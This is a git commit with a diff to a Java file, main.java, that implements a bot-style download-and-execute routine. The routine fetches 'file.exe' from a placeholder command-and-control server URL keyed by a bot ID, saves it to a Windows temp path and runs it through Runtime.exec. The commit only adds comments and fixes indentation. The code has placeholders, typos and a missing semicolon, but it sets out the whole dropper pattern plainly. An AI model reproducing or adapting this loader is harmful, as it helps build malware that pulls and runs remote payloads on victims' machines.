08c49d6ad7672557a7df0167e3079272d22188f5
Error 404 - Name not found <bcr25939@kyois.com>
2017-04-23 11:29:37 -0400

    Identation fix, included commentary

--- main.java
+++ main.java
@@ -5,14 +5,18 @@ public class main{
 	public static void downloadAndExecuteCode() throws Exception {
 		//downloading the executable from webserver, neeeds to be changed to real server
 		try(
+
+		  //Connect to webpage and begin to download executable
 		  ReadableByteChannel in=Channels.newChannel(
-		    new URL("http://<command and control server ip>/<bot_id>/commands/file.exe").openStream());
+		    new URL("http://<SERVER_IP/HOSTNAME>/<BOT_ID>/commands/file.exe").openStream());
+		  
+		  //Save file to tmp directory for quick execution
 		  FileChannel out=new FileOutputStream(
 		    "C:\\Winodws\\tmp\\file.exe").getChannel() ) {
 
 		  out.transferFrom(in, 0, Long.MAX_VALUE); 
 		}
-
+	}
 		//use process builder to create process to run downloaded .exe
 		//ProcessBuilder pb = new ProcessBuilder(pathToExe);
 		//Map<String, String> env = pb.environment();
@@ -23,11 +27,10 @@ public class main{
 		//command.add("./file.exe")
 
 		//OR use Process function, duh
-		public static void main(String[] args) throws Exception {
+	public static void main(String[] args) throws Exception {
 			String[] cmd = { "C:\\Winodws\\tmp\\file.exe" }
 			Process p = Runtime.getRuntime().exec(cmd);
 			p.waitFor();
-		}
 	}
 }
 
